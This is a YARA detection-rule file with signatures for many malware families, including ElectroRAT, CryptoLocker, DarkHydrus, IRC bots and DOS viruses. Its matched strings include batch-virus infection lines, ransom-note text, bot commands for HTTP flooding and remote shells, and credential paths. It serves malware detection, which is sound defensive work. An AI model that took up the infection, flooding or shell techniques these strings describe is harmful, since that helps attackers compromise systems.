rule All_ElectroRAT {
   meta:
      filename = "MAL - file b96bd6bbf0e3f4f98b606a2ab5db4a69"
      hash1 = "2f83e130e52cb13944899e81f4ecf49decf52e3949f6d41b45e8b1a19a658ed6"
   strings:
      $s1 = "        <requestedExecutionLevel level='asInvoker' uiAccess='false' />" fullword ascii
      $s2 = " Type Descriptor'" fullword ascii
      $s3 = "operator co_await" fullword ascii
      $s4 = ":* /B;" fullword wide
      $s5 = "xekcovstphxxvaovlskihgxvyxjwyusnymdfsoxucgubigqjmjimcevkffbocljjyvqkpfbnfrpelqejkkfpklbyojutfvxbjotsdknmywu" fullword wide
      $s6 = "kwoghvhecyrccrreaooisah" fullword wide
      $s7 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" fullword ascii
      $s8 = "INGPADDINGXXPADDINGPADD" fullword ascii
      $s9 = "PADPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADD" ascii
      $s10 = "INGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADD" ascii
      $s11 = " Base Class Descriptor at (" fullword ascii
      $s12 = " Class Hierarchy Descriptor'" fullword ascii
      $s13 = " Complete Object Locator'" fullword ascii
      $s14 = "ghjmghnt34" fullword wide
      $s15 = "ghjghnrt456" fullword wide
      $s16 = "f( /Qm" fullword wide
      $s17 = "f( /A(" fullword wide
      $s18 = "f( /qI" fullword wide
      $s19 = "f( /mI" fullword wide
      $s20 = "f( /N2" fullword wide
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule DROP_BAT {
   meta:
      filename = "MAL - file DROP_B~1.BAT"
      hash1 = "586bfcdacc303a9053ea56125b6b05955b2bf063a60f334d733fe1012865522b"
   strings:
      $s1 = "command /c c:\\_DroP DroP sh" fullword ascii
      $s2 = "del $DroP$.com" fullword ascii
      $s3 = "find \"DroP\"<%0.bat>c:\\_DroP.bat" fullword ascii
      $s4 = "type c:\\_DroP.bat>DroP.t" fullword ascii
      $s5 = "attrib c:\\_DroP.bat +h" fullword ascii
      $s6 = "if exist c:\\_DroP.bat goto DroP_go" fullword ascii
      $s7 = "find \"DroP\"<%0>c:\\_DroP.bat" fullword ascii
      $s8 = "echo n $DroP$.com>DroP.t" fullword ascii
      $s9 = "mem /c|find /i \"DroP\">nul" fullword ascii
      $s10 = "if exist %0.bat goto DroP_d1" fullword ascii
      $s11 = "for %%a in (*.bat ..\\*.bat) do call c:\\_DroP DroP in %%a" fullword ascii
      $s12 = "@echo off%_DroP%" fullword ascii
      $s13 = "if not errorlevel 1 goto DroP_r9" fullword ascii
      $s14 = "if not errorlevel 1 goto DroP_end" fullword ascii
      $s15 = ":: host batch here" fullword ascii
      $s16 = "echo e 01D0  01 8B 36 32 01 FB EB 5A 90 C6 06 3D 01 FF FB C6>>DroP.t" fullword ascii
      $s17 = "echo e 0130  00 00 00 00 00 00 00 00 00 B8 40 00 FF 00 00 00>>DroP.t" fullword ascii
      $s18 = "echo e 01C0  A1 38 01 8E C0 2E 80 3E 3F 01 00 74 0C 8B 3E 30>>DroP.t" fullword ascii
      $s19 = "echo e 02B0  80 E4 B4 58 7A 01 F9 D1 D0 A3 BE 02 C3 90 00 00>>DroP.t" fullword ascii
      $s20 = ":DroP_end" fullword ascii
   condition:
      uint16(0) == 0x6540 and filesize < 7KB and
      8 of them

}


rule BAT_SKULL {
   meta:
      filename = "MAL - file SKULL_~1.BAT"
      hash1 = "33f85caf7415270444ee0620d88be9045a2581dc93408bd808b3af147a470b3b"
   strings:
      $s1 = "set SKuL=C:\\AUTOEXEC.BAT" fullword ascii
      $s2 = ">SKuL.com" fullword ascii
      $s3 = "if errorlevel 1 type C:\\SKuL>>%SKuL%" fullword ascii
      $s4 = "find \"SKuL\"<%0.bat>C:\\SKuL" fullword ascii
      $s5 = "find /i \"SKuL\"<%SKuL%>nul" fullword ascii
      $s6 = "if not exist %0.bat goto SKuL" fullword ascii
      $s7 = "if exist C:\\SKuL goto SKuL2" fullword ascii
      $s8 = "attrib C:\\SKuL +h" fullword ascii
      $s9 = "if not exist %SKuL% goto SKuL" fullword ascii
      $s10 = "if errorlevel 1 goto SKuL1" fullword ascii
      $s11 = "for %%f in (D:*.bat C:*.bat ..\\*.bat) do set SKuL=%%f" fullword ascii
      $s12 = "echo.|date|find \"20\">nul%[SKuL]%" fullword ascii
      $s13 = "@echo off%[SKuL]%" fullword ascii
      $s14 = "set SKuL=" fullword ascii
      $s15 = "[8mSKuL" fullword ascii
      $s16 = ":SKuL " fullword ascii
      $s17 = "::SKuL" fullword ascii
      $s18 = ":SKuL2 " fullword ascii
      $s19 = ":SKuL1 " fullword ascii
      $s20 = "::echo " fullword ascii
   condition:
      uint16(0) == 0x3a3a and filesize < 1KB and
      1 of them
}

rule MAL_rootkit {
   meta:
      filename = "MAL - file rootkit.ex1"
      hash1 = "5af3fd53aea5e008d8725c720ea0290e2e0cd485d8a953053ccf02e5e81a94a0"
   strings:
      $s1 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" publicKeyToken=\"6595b64144ccf1d" ascii
      $s2 = "<assemblyIdentity type=\"win32\" name=\"(C) Microsoft FullCopy\" version=\"1.0.0.0\" processorArchitecture=\"*\"/>" fullword ascii
      $s3 = "uage=\"*\" processorArchitecture=\"*\"/>" fullword ascii
      $s4 = "OLLYDBG" fullword ascii
      $s5 = "* ~\"$&" fullword ascii
      $s6 = "Tz\\.\"k" fullword ascii
      $s7 = "ODKN0m&E" fullword ascii
      $s8 = "Debugger status:" fullword ascii
      $s9 = "YMzC+ko" fullword ascii
      $s10 = "eClrI|+" fullword ascii
      $s11 = "BORlc0:h" fullword ascii
      $s12 = "Nn,.luY" fullword ascii
      $s13 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" publicKeyToken=\"6595b64144ccf1d" ascii 
      $s14 = "Debugger found!" fullword ascii
      $s15 = "Debugger not found!" fullword ascii
      $s16 = "\\!r+qX'" fullword ascii
      $s17 = "notepad" fullword wide
      $s18 = "^`\\9T25" fullword ascii
      $s19 = "@-^}on" fullword ascii
      $s20 = "$R~gG." fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      8 of them
}

rule Trojan_Careto {
   meta:
      filename = "MAL - file 19e818d0da361c4feedd456fca63d68d4b024fbbd3d9265f606076c7ee72e8f8.ViR"
      hash1 = "19e818d0da361c4feedd456fca63d68d4b024fbbd3d9265f606076c7ee72e8f8"
   strings:
      $s1 = " http://crl.verisign.com/pca3.crl0" fullword ascii
      $s2 = "TecSystem Ltd.0" fullword ascii
      $s3 = "TecSystem Ltd.1>0<" fullword ascii
      $s4 = "DDDDDDDDDDDED" ascii
      $s5 = "vGp0cS" fullword ascii
      $s6 = "ytioet" fullword ascii
      $s7 = "grQbCk6" fullword ascii
      $s8 = "c_____;[" fullword ascii
      $s9 = "+VVVVV" fullword ascii
      $s10 = "UUUUUUUUUUUUUUUUUUUUUU_" fullword ascii
      $s11 = "UUUUUUU?" fullword ascii
      $s12 = "cNfPWJ~" fullword ascii
      $s13 = "resource.hxx" fullword ascii
      $s14 = "tpGg3}e" fullword ascii
      $s15 = "sSeqoMu" fullword ascii
      $s16 = ";eJDf\\NM" fullword ascii
      $s17 = "++VVVVVVVV" fullword ascii
      $s18 = ".Ypn #" fullword ascii
      $s19 = "ksdf$6$&fik" fullword ascii
      $s20 = "name=\"Microsoft.Windows.IE.WinFXDocObj\"" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule Casade_Virus_COM {
   meta:
      filename = "MAL - file ami.com"
      hash1 = "96f589992e424e183fc13df9f4e85421abd4f0f6adabd1168a33c4c1d2ca2137"
   strings:
      $s1 = "]PPPPB@A@@TTTT" fullword ascii
      $s2 = "7RhU1R%P" fullword ascii
      $s3 = "AB@CGFt" fullword ascii
      $s4 = "A liU\"R" fullword ascii
      $s5 = "$EkV<P" fullword ascii
      $s6 = "<PkV,@4" fullword ascii
      $s7 = "'v (Ty" fullword ascii
      $s8 = "1=15GNu" fullword ascii
   condition:
      uint16(0) == 0x0000 and filesize < 4KB and
      all of them
}

rule Caterpillar_malware {
   meta:
      filename = "MAL - file Caterpillar.e.com"
      hash1 = "b348e12b41582ade8389ccc2a9acf9797a5d88b9027c37ace53313ea6a32baa7"
   strings:
      $s1 = "RRR.COM" fullword ascii
      $s2 = " No 68 -><- Line No 69 -><- Line No 6A -><- Line No 6B -><- Line No 6C -><- Line No 6D -><- Line No 6E -><- Line No 6F -><- Line" ascii
      $s3 = " No 08 -><- Line No 09 -><- Line No 0A -><- Line No 0B -><- Line No 0C -><- Line No 0D -><- Line No 0E -><- Line No 0F -><- Line" ascii
      $s4 = " No B8 -><- Line No B9 -><- Line No BA -><- Line No BB -><- Line No BC -><- Line No BD -><- Line No BE -><- Line No BF -><- Line" ascii
      $s5 = " No B0 -><- Line No B1 -><- Line No B2 -><- Line No B3 -><- Line No B4 -><- Line No B5 -><- Line No B6 -><- Line No B7 -><- Line" ascii
      $s6 = " No 90 -><- Line No 91 -><- Line No 92 -><- Line No 93 -><- Line No 94 -><- Line No 95 -><- Line No 96 -><- Line No 97 -><- Line" ascii
      $s7 = " No 20 -><- Line No 21 -><- Line No 22 -><- Line No 23 -><- Line No 24 -><- Line No 25 -><- Line No 26 -><- Line No 27 -><- Line" ascii
      $s8 = "!<-====-><- Line No 01 -><- Line No 02 -><- Line No 03 -><- Line No 04 -><- Line No 05 -><- Line No 06 -><- Line No 07 -><- Line" ascii
      $s9 = " No 18 -><- Line No 19 -><- Line No 1A -><- Line No 1B -><- Line No 1C -><- Line No 1D -><- Line No 1E -><- Line No 1F -><- Line" ascii
      $s10 = " No 30 -><- Line No 31 -><- Line No 32 -><- Line No 33 -><- Line No 34 -><- Line No 35 -><- Line No 36 -><- Line No 37 -><- Line" ascii
      $s11 = " No F8 -><- Line No F9 -><- Line No FA -><- Line No FB -><- Line No FC -><- Line No FD -><- Line No FE -><- Line No FF ->!" fullword ascii
      $s12 = " No 38 -><- Line No 39 -><- Line No 3A -><- Line No 3B -><- Line No 3C -><- Line No 3D -><- Line No 3E -><- Line No 3F -><- Line" ascii
      $s13 = " No 40 -><- Line No 41 -><- Line No 42 -><- Line No 43 -><- Line No 44 -><- Line No 45 -><- Line No 46 -><- Line No 47 -><- Line" ascii
      $s14 = " No 10 -><- Line No 11 -><- Line No 12 -><- Line No 13 -><- Line No 14 -><- Line No 15 -><- Line No 16 -><- Line No 17 -><- Line" ascii
      $s15 = " No 78 -><- Line No 79 -><- Line No 7A -><- Line No 7B -><- Line No 7C -><- Line No 7D -><- Line No 7E -><- Line No 7F -><- Line" ascii
      $s16 = " No A8 -><- Line No A9 -><- Line No AA -><- Line No AB -><- Line No AC -><- Line No AD -><- Line No AE -><- Line No AF -><- Line" ascii
      $s17 = " No 80 -><- Line No 81 -><- Line No 82 -><- Line No 83 -><- Line No 84 -><- Line No 85 -><- Line No 86 -><- Line No 87 -><- Line" ascii
      $s18 = " No 50 -><- Line No 51 -><- Line No 52 -><- Line No 53 -><- Line No 54 -><- Line No 55 -><- Line No 56 -><- Line No 57 -><- Line" ascii
      $s19 = " No 60 -><- Line No 61 -><- Line No 62 -><- Line No 63 -><- Line No 64 -><- Line No 65 -><- Line No 66 -><- Line No 67 -><- Line" ascii
      $s20 = " No E8 -><- Line No E9 -><- Line No EA -><- Line No EB -><- Line No EC -><- Line No ED -><- Line No EE -><- Line No EF -><- Line" ascii
   condition:
      uint16(0) == 0x9090 and filesize < 10KB and
      8 of them
}

rule MAL_DOS_Civil_war {
   meta:
      filename = "MAL - file CW-0282.COM"
      hash1 = "0addd7bcaac1a3e6f3df326fc11f98c6447543891b4cac9c1aaee18c6e393dd1"
   strings:
      $s1 = "The Navigator, (c) 1992 Dark Helmet" fullword ascii
   condition:
      uint16(0) == 0x03e9 and filesize < 1KB and
      all of them
}

rule MAL_Coll_DarkHydrus {
   meta:
      filename = "MAL - file Coll.DarkHydrus"
      hash1 = "f4aa8d74d3f60c2fb8ab32cae774095d3bcbb3349f039aed8ef60f47ddc69600"
   strings:
      $s1 = "DarkHydrusPayload.bin" fullword ascii
      $s2 = "DarkHydrusPowershellScript.bin" fullword ascii
      $s3 = "RogueRobinPowershellPayloadObfuscated.bin" fullword ascii
      $s4 = "DarkHydrusImplant.bin" fullword ascii
      $s5 = "DarkHydrus.bin" fullword ascii
      $s6 = "RogueRobinMSExcelDropper.bin" fullword ascii
      $s7 = "Ay4N -WDj@" fullword ascii
      $s8 = "prJZMy8" fullword ascii
      $s9 = "+^|+ 0" fullword ascii
      $s10 = "XZgTzal" fullword ascii
      $s11 = "Nnge1)X7" fullword ascii
      $s12 = "RUAMyh'" fullword ascii
      $s13 = "rlyy66j}BG" fullword ascii
      $s14 = "wvhzz^g[t" fullword ascii
      $s15 = "NipIcey" fullword ascii
      $s16 = "'].KvW" fullword ascii
      $s17 = "{NAZt5t_" fullword ascii
      $s18 = "$HNqw?" fullword ascii
      $s19 = "qFfYQ^d" fullword ascii
      $s20 = "3YOHL^ID" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 600KB and
      8 of them
}

rule CryptoLocker {
   meta:
      filename = "MAL - file {71257279-042b-371d-a1d3-fbf8d2fadffa}.exe"
      hash1 = "d765e722e295969c0a5c2d90f549db8b89ab617900bf4698db41c7cdad993bb9"
   strings:
      $s1 = "Failed to decrypt a previously encrypted file \"%s\". Perhaps the file may be damaged or used by another process." fullword wide
      $s2 = "      <assemblyIdentity type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='x86' publ" ascii
      $s3 = "ster}}}\\cf1\\ulnone\\b0\\f0\\fs20  at Ukash.com, login and then go to the Manage Ukash area to use the Combine tool.\\par" fullword ascii
      $s4 = "You can \\b combine multiple values\\b0  of your Ukash into a single amount and have your new Ukash Code and value emailed to yo" ascii
      $s5 = "Encryption was produced using a \\b unique\\b0  public key \\cf2\\ul\\b{\\field{\\*\\fldinst{HYPERLINK \"http://en.wikipedia.org" ascii
      $s6 = "Failed to decrypt the file \"%s\". Perhaps the file may be damaged or used by another process." fullword wide
      $s7 = "{\\field{\\*\\fldinst{HYPERLINK \"https://www.ukash.com/en-GB/where-to-get/\"}}{\\fldrslt{\\ul Get Ukash}}}\\cf1\\kerning0\\ulno" ascii
      $s8 = "{\\field{\\*\\fldinst{HYPERLINK \"https://www.ukash.com/en-GB/where-to-get/\"}}{\\fldrslt{\\ul Get Ukash}}}\\cf1\\kerning0\\ulno" ascii
      $s9 = "Encryption was produced using a \\b unique\\b0  public key \\cf2\\ul\\b{\\field{\\*\\fldinst{HYPERLINK \"http://en.wikipedia.org" ascii
      $s10 = "      <assemblyIdentity type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='x86' publ" ascii
      $s11 = "@Msftedit.dll" fullword wide
      $s12 = "@urlmon.dll" fullword wide
      $s13 = "\\cf3\\b{\\field{\\*\\fldinst{HYPERLINK \"https://www.ukash.com/en-GB/\"}}{\\fldrslt{\\ul Home Page}}}\\ulnone\\f0\\fs20\\par" fullword ascii
      $s14 = "\\cf3\\b{\\field{\\*\\fldinst{HYPERLINK \"https://www.moneypak.com/\"}}{\\fldrslt{\\ul Home Page}}}\\ulnone\\f0\\fs20\\par" fullword ascii
      $s15 = "The private key destruction is suspended for the time of payment processing." fullword wide
      $s16 = "if you want. You will need to {\\field{\\*\\fldinst{HYPERLINK \"https://www.ukash.com/en-GB/registration/\"}}{\\fldrslt{\\cf3\\u" ascii
      $s17 = "Make sure that all important files have been decrypted! If part of the files had not been decrypted - move them to the desktop a" wide
      $s18 = "\\viewkind4\\uc1\\pard\\nowidctlpar\\cf1\\lang9\\f0\\fs20 Your important files \\b encryption\\b0  produced on this computer: ph" ascii
      $s19 = "{\\field{\\*\\fldinst{HYPERLINK \"http://bitcoin.org/en/getting-started\"}}{\\fldrslt{\\ul Getting started with Bitcoin}}}\\cf1" ascii
      $s20 = "\\viewkind4\\uc1\\pard\\nowidctlpar\\cf1\\lang9\\kerning1\\f0\\fs20 Ukash is electronic cash and e-commerce brand. Based on a pr" ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      any of them
}

rule CryptoLocker_Trojan_Blocker {
   meta:
      filename = "MAL - file Vcffipzmnipbxzdl.exe"
      hash1 = "c7dc529d8aae76b4e797e4e9e3ea7cd69669e6c3bb3f94d80f1974d1b9f69378"
   strings:
      $s1 = "temperatureSid.exe" fullword wide
      $s2 = "jjjuuu" fullword ascii 
      $s3 = " Type Descriptor'" fullword ascii
      $s4 = "!`l!!!!" fullword ascii
      $s5 = " constructor or from DllMain." fullword ascii

   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      any of them
}

rule MAL_dino_Embedded_PE_File {
   meta:
      filename = "MAL - file dino.bin"
      hash1 = "427ece485005f1bd517b8f0c6c38a8f73bf32350795b83fb8cf937c86f99dfc8"
   strings:
      $x1 = "cmd.exe /C FOR /L %%i IN (1,1,%d) DO IF EXIST \"%s\" (DEL \"%s\" & PING 127.0.0.1 -n 3) ELSE EXIT" fullword wide
      $s2 = "regsvr32.exe /s \\\"%s\\\"" fullword wide
      $s3 = "Dino.exe" fullword ascii
      $s4 = "klavme.exe" fullword wide
      $s5 = "myapp.exe" fullword wide
      $s6 = "testapp.exe" fullword wide
      $s7 = "afyjevmv.exe" fullword wide
      $s8 = "wusvcd.exe" fullword wide
      $s9 = "archive %s successfully created - scheduled to download and erase." fullword wide
      $s10 = "HTTP\\SHELL\\open\\command" fullword wide
      $s11 = "SOFTWARE\\MICROSOFT\\WINDOWS NT\\CurrentVersion\\Winlogon" fullword wide
      $s12 = "INJECT" fullword wide
      $s13 = "Login/Domain (owner): %s/%s (%s)" fullword wide
      $s14 = "CMDEXEC" fullword ascii
      $s15 = "CMDEXECQ" fullword ascii
      $s16 = "Content-Disposition: attachment; filename=7ba09403e9d7122a20fa510de11f7809822e6e11efb164414e2148b762cf4e75.bin" fullword ascii
      $s17 = "ZR_PASSWORD, we didn't get the right password to unzip the file" fullword wide
      $s18 = "exectime" fullword ascii
      $s19 = "\\Roaming\\Mozilla\\Firefox\\Profiles\\*" fullword ascii
      $s20 = "\\Users\\*" fullword ascii
   condition:
      uint16(0) == 0x5448 and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule MAL_YESMILE {
   meta:
      filename = "MAL - file YESMILE.EXE"
      hash1 = "91fa185f353b790b4dfb3b468503244e4c84be8c43959b32d6821d764d5d0c41"
   strings:
      $s1 = "Yeah virus has now infected the partition table !!!!!" fullword ascii
      $s2 = "xpxpp<<8<<" fullword ascii
      $s3 = "xxxxxx88<>" fullword ascii
      $s4 = "||p8>p<" fullword ascii
      $s5 = "<88<<8<" fullword ascii
      $s6 = "t8PQRV" fullword ascii
      $s7 = "p4px<08>8" fullword ascii
      $s8 = "~<8>8||`py" fullword ascii
      $s9 = "88s8<s8<8" fullword ascii
      $s10 = "ffNf.O" fullword ascii
      $s11 = "3|<3<~8|><N" fullword ascii
      $s12 = "x8<xx|p" fullword ascii
   condition:
      uint16(0) == 0x1ceb and filesize < 10KB and
      any of them
}

rule CRDF_Trojan_Dyre_Generic {
   meta:
      filename = "MAL - file fax_390392029_072514.exe"
      hash1 = "10745182ac1b738e4a363166f650069d16b81873b3bbb1990e7d07cb652495e8"
   strings:
      $s1 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii
      $s2 = "AbhOsT}" fullword ascii
      $s3 = "ALJ.SnG" fullword ascii
      $s4 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" fullword ascii
      $s5 = "Syobozi" fullword ascii
      $s6 = "getUN," fullword ascii
      $s7 = "OY* |h" fullword ascii

   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      any of them
}

rule Form_A_BOOT {
   meta:
      filename = "MAL - file Form_A_BOOT.IMA"
      hash1 = "cbf057167113f27850539352d693e0850ef59b0a647ec856723e227167007a90"
   strings:
      $x1 = "SHELL=C:\\COMMAND.COM C:\\ /P /E:160" fullword ascii
      $s2 = "+the SHELL command in the CONFIG.SYS file." fullword ascii
      $s3 = "LOADHIGH c:\\dos\\keyb.com UK,437,c:\\dos\\keyboard.sys" fullword ascii
      $s4 = "C:\\SB16\\SBCONFIG.EXE /S" fullword ascii
      $s5 = "K  /K command      Executes the specified command and continues running." fullword ascii
      $s6 = "ELANCONF.EXE" fullword ascii
      $s7 = "DOSNP.EXE" fullword ascii
      $s8 = "NETBIOS.EXE" fullword ascii
      $s9 = "DEVICE=C:\\DOS\\SMARTDRV.EXE /DOUBLE_BUFFER" fullword ascii

   condition:
      uint16(0) == 0x53eb and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule Friday_the_13th_408 {
   meta:
      filename = "MAL - file Friday_the_13th.408.com"
      hash1 = "0d8d45f33c3be34a5523241113bdc5bac128630a9ceb879f67f0aa877787f08f"
   strings:
      $s1 = "002.COM" fullword ascii
      $s2 = "HOST #1 - You have just released a virus!$" fullword ascii
      $s3 = "PPSQRVWU" fullword ascii
      $s4 = "!(C) 1993 American Eagle Publications Inc., All Rights Reserved. Unauthorized " fullword ascii
      $s5 = "COMMAND.COM" fullword ascii
      $s6 = "????????COM" fullword ascii
      $s7 = "use will be prosecuted under applicable copyright and software piracy laws." fullword ascii
   condition:
      uint16(0) == 0xdde9 and filesize < 1KB and
      all of them
}

rule Friday_the_13th_416_A {
   meta:
      filename = "MAL - file Friday_the_13th.416.A.com"
      hash1 = "527511694daa041f613b9f5fbdae45062bc69dc655f3f584ccba725cd418ea5c"
   strings:
      $s1 = "003.COM" fullword ascii
      $s2 = "HOST #1 - You have just released a virus!$" fullword ascii
      $s3 = "INFECTED" fullword ascii
      $s4 = "PPSQRVWU" fullword ascii
      $s5 = "!(C) 1993 American Eagle Publications Inc., All Rights Reserved. Unauthorized " fullword ascii
      $s6 = "COMMAND.COM" fullword ascii
      $s7 = "????????COM" fullword ascii
      $s8 = "use will be prosecuted under applicable copyright and software piracy laws." fullword ascii
   condition:
      uint16(0) == 0xdde9 and filesize < 1KB and
      all of them
}

rule Friday_the_13th_416_B {
   meta:
      filename = "MAL - file Friday_the_13th.416.B.com"
      hash1 = "6e391ec12f638b91dfee7d7cfc5cd4f47683fc9a2d1fdc88e96956f7f36a60fc"
   strings:
      $s1 = "004.COM" fullword ascii
      $s2 = "HOST #1 - You have just released a virus!$" fullword ascii
      $s3 = "INFECTED" fullword ascii
      $s4 = "PPSQRVWU" fullword ascii
      $s5 = "!(C) 1993 American Eagle Publications Inc., All Rights Reserved. Unauthorized " fullword ascii
      $s6 = "COMMAND.COM" fullword ascii
      $s7 = "????????COM" fullword ascii
      $s8 = "use will be prosecuted under applicable copyright and software piracy laws." fullword ascii
   condition:
      uint16(0) == 0xdde9 and filesize < 1KB and
      all of them
}

rule Friday_the_13th_540_A {
   meta:
      filename = "MAL - file Friday_the_13th.540.A.com"
      hash1 = "2b89d0638a967deec3a203472dccbaf331a2a806efe85ec8b6b57da6f55c3552"
   strings:
      $s1 = "IT WILL INFECT EVERY .COM FILE IN THE CURRENT SUBDIRECTORY!" fullword ascii
      $s2 = "001.COM" fullword ascii
      $s3 = "HOST #1 - You have just released a virus!$" fullword ascii
      $s4 = "WARNING!!!!  THIS PROGRAM IS INFECTED WITH VIRUS-B!" fullword ascii
      $s5 = "INFECTED" fullword ascii
      $s6 = "PPSQRVWU" fullword ascii
      $s7 = "!(C) 1993 American Eagle Publications Inc., All Rights Reserved. Unauthorized " fullword ascii
      $s8 = "COMMAND.COM" fullword ascii
      $s9 = "????????COM" fullword ascii
      $s10 = "use will be prosecuted under applicable copyright and software piracy laws." fullword ascii
   condition:
      uint16(0) == 0xdde9 and filesize < 2KB and
      all of them
}

rule MAL_GREEN {
   meta:
      filename = "MAL - file GREEN.EXE"
      hash1 = "87aaec18d56d29fc14fd7fca96dc672bcbf49239a329de255e0e21c692db1dae"
   strings:
      $s1 = "Execute DOS command" fullword ascii
      $s2 = "c:\\dos\\q.exe" fullword ascii
      $s3 = "\\command.com" fullword ascii
      $s4 = "Execution completed" fullword ascii
      $s5 = "Execute program" fullword ascii
      $s6 = "A:DT.EXE" fullword ascii
      $s7 = "RETURN to execute" fullword ascii
      $s8 = "DISKTREE.CFG" fullword ascii
      $s9 = "Empty!!!" fullword ascii
 
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      all of them
}

rule Trojan_IRCBOT {
   meta:
      filename = "MAL - file BOTBINARY.EXE"
      hash1 = "96ca097b0daff949826f3611116c7efc41343ad15cc76b96db1eeac3c01a3608"
   strings:
      $x1 = "%s[Config] %sAUTOLOAD: %s%s %sAUTOOP: %s%s %sMD5CRYPT: %s%s %sINJECT: %s%s %sMUTEX: %s%s %sINSTALL_DRIVER: %s%s %sSAVE_REG: %s%s" ascii
      $x2 = "C:\\WINDOWS\\system32\\drivers\\ntndis.sys" fullword ascii
      $s3 = "%s[Config] %sAUTOLOAD: %s%s %sAUTOOP: %s%s %sMD5CRYPT: %s%s %sINJECT: %s%s %sMUTEX: %s%s %sINSTALL_DRIVER: %s%s %sSAVE_REG: %s%s" ascii
      $s4 = "Usage: !ircadmin <host> <port> <channel> <password>" fullword ascii
      $s5 = "Usage: !httpflood <host> [port] [path_to_script]" fullword ascii
      $s6 = "D:\\D_DATA\\i\\evil\\Driver\\i386\\Drv.pdb" fullword ascii
      $s7 = "Usage: !getpid <process_name>" fullword ascii
      $s8 = "Couldnot get process ID for \"%s\"" fullword ascii
      $s9 = "DCC Shell: Bad port - %s" fullword ascii
      $s10 = "You are already loggined as admin - %s %s" fullword ascii
      $s11 = "HTTP Flooder: Bad port - %s" fullword ascii
      $s12 = "Mozilla/4.0 compatible ZyBorg/1.0 (wn.zyborg@looksmart.net; http://www.lolyousuck.com)" fullword ascii
      $s13 = "Usage: !shell <command>" fullword ascii
      $s14 = " %sSP2FWBYPASS: %s%s" fullword ascii
      $s15 = "Mozilla/5.0 (Slurp/si; slurp@inktomi.com; http://www.inktomi.com/slurp.html)" fullword ascii
      $s16 = "ndis32.sys" fullword wide
      $s17 = "Usage: !get <url> <local> [noexec]" fullword ascii
      $s18 = "Unknown command - %s" fullword ascii
      $s19 = "FTPd: Bad port - %s" fullword ascii
      $s20 = "Usage: killall <process_name>" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule MAL_Build_IRCBOT {
   meta:
      filename = "MAL - file Build.exe"
      hash1 = "84d06e7541bafcf499ac69d3ededa494556aea6c4af4f979f7b7493dbf3aaa76"
   strings:
      $s1 = "Inject code (if driver fails)" fullword wide
      $s2 = "Invalid password or IRC ident" fullword ascii
      $s3 = "IRC server need password" fullword wide
      $s4 = "Invalid password or IP address" fullword ascii
      $s5 = "Bindshell, port:" fullword wide
      $s6 = "Bypass XP SP2 Firewall" fullword wide
      $s7 = "Invalid IRC port" fullword ascii
      $s8 = "BOT PASSWORD:" fullword wide
      $s9 = "Install Kernel Driver" fullword wide
      $s10 = "Enter your password:" fullword wide
      $s11 = "tsrcport" fullword wide
      $s12 = "usrcport" fullword wide
      $s13 = "Couldnot write to binary: file access error" fullword ascii
      $s14 = "Good script value: %d" fullword ascii
      $s15 = "Ok, key is valid and will be stored in HKEY_CURRENT_USER\\Software\\Illusion" fullword ascii
      $s16 = "http://illusion.cup.su" fullword wide
      $s17 = "Invalid IRC channel" fullword ascii
      $s18 = "Invalid IRC server" fullword ascii
      $s19 = "No clients selected. Select IRC and/or WEB!" fullword ascii
      $s20 = "IRC Administration" fullword wide
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule ArdamaxKeylogger_E33AF9E602CBB7AC3634C2608150DD18 {
   meta:
      filename = "MAL - file ArdamaxKeylogger_E33AF9E602CBB7AC3634C2608150DD18"
      hash1 = "8c870eec48bc4ea1aca1f0c63c8a82aaadaf837f197708a7f0321238da8b6b75"
   strings:
      $s1 = ".?AVCLoader@@" fullword ascii
      $s2 = "wwwwwwwwwxwwp" fullword ascii
      $s3 = "egkfrkzm" fullword ascii
      $s4 = "0Failed to init." fullword wide
      $s5 = ".?AV?$CStreamDecompress@VCWin32FileReader@@VCWin32FileWriter@@VCStreamSimpleCallback@@@@" fullword ascii
      $s6 = "iJ~EYeq" fullword ascii
      $s7 = "ejxCPkL2" fullword ascii
      $s8 = ")K%z%W" fullword ascii
      $s9 = "QjDJrd3" fullword ascii
      $s10 = "%COp%y" fullword ascii
      $s11 = "cDn- '>" fullword ascii
      $s12 = "unknown compression method" fullword ascii
      $s13 = "zGhZx?n" fullword ascii
      $s14 = "dafhdag Y" fullword ascii
      $s15 = "WplB7!#" fullword ascii
      $s16 = "mgFV\\[" fullword ascii
      $s17 = "zpFuid>)i" fullword ascii
      $s18 = "bGoRJ\";" fullword ascii
      $s19 = "WfyIA~y" fullword ascii
      $s20 = "igDONU(" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule Fake_Intel {
   meta:
      filename = "MAL - file Fake Intel.exe"
      hash1 = "b71a4a57d21742797ec9079c745e2f884cb9379717069189bf0839078b0e2c62"
   strings:
      $s1 = "DiagResENU.Dll" fullword wide
